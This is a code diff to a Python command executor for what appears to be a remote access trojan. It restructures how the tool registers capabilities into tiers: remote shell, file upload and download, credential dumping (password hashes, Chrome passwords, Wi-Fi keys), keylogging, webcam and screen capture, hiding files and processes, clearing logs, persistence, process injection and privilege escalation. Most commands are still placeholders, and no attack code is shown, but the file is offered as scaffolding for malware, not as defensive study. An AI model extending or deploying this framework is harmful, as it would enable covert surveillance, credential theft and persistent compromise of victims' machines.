@@ -18,7 +18,11 @@ class EliteCommandExecutor:
     def __init__(self):
         self.commands: Dict[str, Callable] = {}
         self.command_history: List[Dict] = []
-        self._load_elite_commands()
+        self._setup_command_imports()
+        self._load_tier1_commands()
+        self._load_tier2_commands()
+        self._load_tier3_commands()
+        self._load_tier4_commands()
         
         # Import security bypass if available
         try:
@@ -103,152 +107,97 @@ class EliteCommandExecutor:
         else:
             return {"success": False, "error": f"Unknown command: {command}"}
     
-    def _load_elite_commands(self):
-        """Load all elite command implementations"""
-        
-        # Import elite command modules (will be created in Phase 3)
-        # For now, create placeholder structure
-        
-        # Import and register elite commands as they are implemented
-        # Use absolute imports to avoid issues
+    
+    def _setup_command_imports(self):
+        """Setup import path for elite commands"""
         import sys
         import os
         
-        # Add current directory to path for imports
-        current_dir = os.path.dirname(os.path.abspath(__file__))
-        if current_dir not in sys.path:
-            sys.path.insert(0, current_dir)
+        commands_path = os.path.join(os.path.dirname(__file__), 'elite_commands')
+        if commands_path not in sys.path:
+            sys.path.insert(0, commands_path)
+    
+    def _load_tier1_commands(self):
+        """Load Tier 1 elite commands"""
         
-        try:
-            from elite_commands.elite_ls import elite_ls
-            self.commands['ls'] = elite_ls
-        except ImportError as e:
-            self.commands['ls'] = self._placeholder_command('ls')
-            
-        try:
-            from elite_commands.elite_download import elite_download
-            self.commands['download'] = elite_download
-        except ImportError as e:
-            self.commands['download'] = self._placeholder_command('download')
-            
-        try:
-            from elite_commands.elite_upload import elite_upload
-            self.commands['upload'] = elite_upload
-        except ImportError as e:
-            self.commands['upload'] = self._placeholder_command('upload')
-            
-        try:
-            from elite_commands.elite_shell import elite_shell
-            self.commands['shell'] = elite_shell
-        except ImportError as e:
-            self.commands['shell'] = self._placeholder_command('shell')
-            
-        try:
-            from elite_commands.elite_ps import elite_ps
-            self.commands['ps'] = elite_ps
-        except ImportError as e:
-            self.commands['ps'] = self._placeholder_command('ps')
-            
-        try:
-            from elite_commands.elite_kill import elite_kill
-            self.commands['kill'] = elite_kill
-        except ImportError as e:
-            self.commands['kill'] = self._placeholder_command('kill')
+        # Direct imports with detailed error handling
+        commands_to_load = [
+            ('ls', 'elite_ls', 'elite_ls'),
+            ('download', 'elite_download', 'elite_download'),
+            ('upload', 'elite_upload', 'elite_upload'),
+            ('shell', 'elite_shell', 'elite_shell'),
+            ('ps', 'elite_ps', 'elite_ps'),
+            ('kill', 'elite_kill', 'elite_kill')
+        ]
         
-        # Other core file system commands (placeholders for now)
-        self.commands.update({
-            'cd': self._placeholder_command('cd'),
-            'pwd': self._placeholder_command('pwd'),
-            'cat': self._placeholder_command('cat'),
-            'upload': self._placeholder_command('upload'),
-            'rm': self._placeholder_command('rm'),
-            'mkdir': self._placeholder_command('mkdir'),
-            'rmdir': self._placeholder_command('rmdir'),
-            'mv': self._placeholder_command('mv'),
-            'cp': self._placeholder_command('cp'),
-        })
+        for cmd_name, module_name, func_name in commands_to_load:
+            try:
+                module = __import__(module_name)
+                func = getattr(module, func_name)
+                self.commands[cmd_name] = func
+                print(f"✅ Loaded {cmd_name} command")
+            except Exception as e:
+                self.commands[cmd_name] = self._placeholder_command(cmd_name)
+                print(f"⚠️ Failed to load {cmd_name}: {e}")
+    
+    def _load_tier2_commands(self):
+        """Load Tier 2 elite commands (credential & data)"""
+        tier2_commands = {
+            'hashdump': 'elite_hashdump',
+            'chromedump': 'elite_chromedump',
+            'wifikeys': 'elite_wifikeys',
+            'screenshot': 'elite_screenshot',
+            'keylogger': 'elite_keylogger'
+        }
         
-        # System information commands
-        self.commands.update({
-            'systeminfo': self._placeholder_command('systeminfo'),
-            'whoami': self._placeholder_command('whoami'),
-            'hostname': self._placeholder_command('hostname'),
-            'username': self._placeholder_command('username'),
-            'privileges': self._placeholder_command('privileges'),
-            'network': self._placeholder_command('network'),
-            'processes': self._placeholder_command('processes'),
-            'installedsoftware': self._placeholder_command('installedsoftware'),
-        })
+        for cmd_name, module_name in tier2_commands.items():
+            # Will be implemented - for now use placeholders
+            self.commands[cmd_name] = self._placeholder_command(cmd_name)
+    
+    def _load_tier3_commands(self):
+        """Load Tier 3 elite commands (stealth & persistence)"""
+        tier3_commands = {
+            'persistence': 'elite_persistence',
+            'unpersistence': 'elite_unpersistence',
+            'hidefile': 'elite_hidefile',
+            'unhidefile': 'elite_unhidefile',
+            'hideprocess': 'elite_hideprocess',
+            'unhideprocess': 'elite_unhideprocess',
+            'clearlogs': 'elite_clearlogs',
+            'firewall': 'elite_firewall',
+            'migrate': 'elite_migrate'
+        }
         
-        # Stealth commands
-        self.commands.update({
-            'hidecmd': self._placeholder_command('hidecmd'),
-            'unhidecmd': self._placeholder_command('unhidecmd'),
-            'hideprocess': self._placeholder_command('hideprocess'),
-            'unhideprocess': self._placeholder_command('unhideprocess'),
-            'hidefile': self._placeholder_command('hidefile'),
-            'unhidefile': self._placeholder_command('unhidefile'),
-            'hidereg': self._placeholder_command('hidereg'),
-            'unhidereg': self._placeholder_command('unhidereg'),
-        })
+        for cmd_name, module_name in tier3_commands.items():
+            # Will be implemented - for now use placeholders
+            self.commands[cmd_name] = self._placeholder_command(cmd_name)
+    
+    def _load_tier4_commands(self):
+        """Load Tier 4 elite commands (advanced features)"""
+        tier4_commands = {
+            'inject': 'elite_inject',
+            'port_forward': 'elite_port_forward',
+            'socks_proxy': 'elite_socks_proxy',
+            'escalate': 'elite_escalate',
+            'vmscan': 'elite_vmscan'
+        }
         
-        # Credential harvesting
-        self.commands.update({
-            'chromedump': self._placeholder_command('chromedump'),
-            'hashdump': self._placeholder_command('hashdump'),
-            'wifikeys': self._placeholder_command('wifikeys'),
-            'askpass': self._placeholder_command('askpass'),
-        })
+        for cmd_name, module_name in tier4_commands.items():
+            # Will be implemented - for now use placeholders
+            self.commands[cmd_name] = self._placeholder_command(cmd_name)
         
-        # Process management
-        self.commands.update({
-            'ps': self._placeholder_command('ps'),
-            'kill': self._placeholder_command('kill'),
-            'migrate': self._placeholder_command('migrate'),
-            'inject': self._placeholder_command('inject'),
-        })
+        # Add remaining placeholder commands that aren't implemented yet
+        remaining_commands = [
+            'cd', 'pwd', 'cat', 'rm', 'mkdir', 'rmdir', 'mv', 'cp',
+            'systeminfo', 'whoami', 'hostname', 'username', 'privileges', 'network', 'processes', 'installedsoftware',
+            'hidecmd', 'unhidecmd', 'hideprocess', 'unhideprocess', 'hidefile', 'unhidefile', 'hidereg', 'unhidereg',
+            'askpass', 'migrate', 'inject', 'shutdown', 'restart', 'screenrec', 'webcam', 'stopkeylogger',
+            'viewlogs', 'ssh', 'sudo', 'download_exec', 'upload_exec', 'chromepasswords'
+        ]
         
-        # System control
-        self.commands.update({
-            'shutdown': self._placeholder_command('shutdown'),
-            'restart': self._placeholder_command('restart'),
-            'firewall': self._placeholder_command('firewall'),
-            'escalate': self._placeholder_command('escalate'),
-        })
-        
-        # Monitoring
-        self.commands.update({
-            'screenshot': self._placeholder_command('screenshot'),
-            'screenrec': self._placeholder_command('screenrec'),
-            'webcam': self._placeholder_command('webcam'),
-            'keylogger': self._placeholder_command('keylogger'),
-            'stopkeylogger': self._placeholder_command('stopkeylogger'),
-        })
-        
-        # Log management
-        self.commands.update({
-            'viewlogs': self._placeholder_command('viewlogs'),
-            'clearlogs': self._placeholder_command('clearlogs'),
-        })
-        
-        # Shell & access
-        self.commands.update({
-            'shell': self._placeholder_command('shell'),
-            'ssh': self._placeholder_command('ssh'),
-            'sudo': self._placeholder_command('sudo'),
-        })
-        
-        # Advanced features
-        self.commands.update({
-            'persistence': self._placeholder_command('persistence'),
-            'unpersistence': self._placeholder_command('unpersistence'),
-            'download_exec': self._placeholder_command('download_exec'),
-            'upload_exec': self._placeholder_command('upload_exec'),
-            'port_forward': self._placeholder_command('port_forward'),
-            'socks_proxy': self._placeholder_command('socks_proxy'),
-            'vmscan': self._placeholder_command('vmscan'),
-            'chromepasswords': self._placeholder_command('chromepasswords'),
-        })
+        for cmd in remaining_commands:
+            if cmd not in self.commands:  # Don't overwrite loaded commands
+                self.commands[cmd] = self._placeholder_command(cmd)
         
         # Deprecated commands (return error)
         self.commands.update({
